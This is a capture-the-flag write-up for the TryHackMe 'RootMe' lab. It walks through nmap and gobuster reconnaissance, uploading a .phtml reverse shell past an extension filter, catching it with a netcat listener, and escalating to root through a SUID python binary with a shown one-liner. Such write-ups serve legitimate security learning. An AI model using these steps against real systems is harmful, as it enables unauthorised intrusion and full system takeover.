### ROOTME

## Plateform : TryHackMe

# Write up

We start with a given IP address that we scan with nmap

```bash
└─$ nmap -sV 10.128.166.86
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-09 01:19 -0800
Nmap scan report for 10.128.166.86
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
```

With an HTTP service exposed, we can use gobuster in order to discover some hidden URL endpoint

```bash
└─$ gobuster dir -u http://10.128.166.86:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.128.166.86:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,xml,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 616]
uploads              (Status: 301) [Size: 316] [--> http://10.128.166.86/uploads/]
css                  (Status: 301) [Size: 312] [--> http://10.128.166.86/css/]
js                   (Status: 301) [Size: 311] [--> http://10.128.166.86/js/]
panel                (Status: 301) [Size: 314] [--> http://10.128.166.86/panel/]
server-status        (Status: 403) [Size: 278]
...
```
The interesting endpoint here is the /panel one. We end up on a document upload page. We must think about a PHP reverse shell abuse. First we need to verify the extensions we can upload. Using Burp Suite, we can discover that many extensions can be uploaded such as php or phtml. I'll use a phtml reverse shell. Let's setup the listener 

```bash
└─$ nc -lvnp 1234         
Listening on 0.0.0.0 1234
```

Then we upload the reverse shell on the /panel and click on "veja!". The connection to our listener is created and we have a shell. Let's discover who we are and retrieve the flag that is asked.

```bash
└─$ nc -lvnp 1234         
Listening on 0.0.0.0 1234
Connection received on 10.128.166.86 60988
Linux ip-10-128-166-86 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:29:03 up 11 min,  0 users,  load average: 0.08, 0.28, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami 
www-data
$ pwd
/
$ find / -type f -name user.txt 2> /dev/null 
/var/www/user.txt
$ cat /var/www/user.txt
XXX{XXXXXXXXXXXXXXX}
```
Then we must privilege escalate. One important thing is to look at executables files with SUID bit activated that shouldn't have these rights.

```bash
$ find / -perm -4000 -type f 2> /dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
```
 
The file python service can be used to gain higher privileges. Thanks to CTFObins web site, we can get a shell and retrieve the challenge's last flag. 

```bash
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
find / -type f -name root.txt 2> /dev/null
/root/root.txt
cat /root/root.txt
XXX{XXXXXXXXXXXXXXXXXXXX}
```

# Key takeaway

- With an web document uploader, we must think of a php reverse shell. Sometimes the extensions can vary, it's important to look at other extensions such as phtml for example
- To gain higher privileges, look at the unexpected binaries with SUID activated, here python
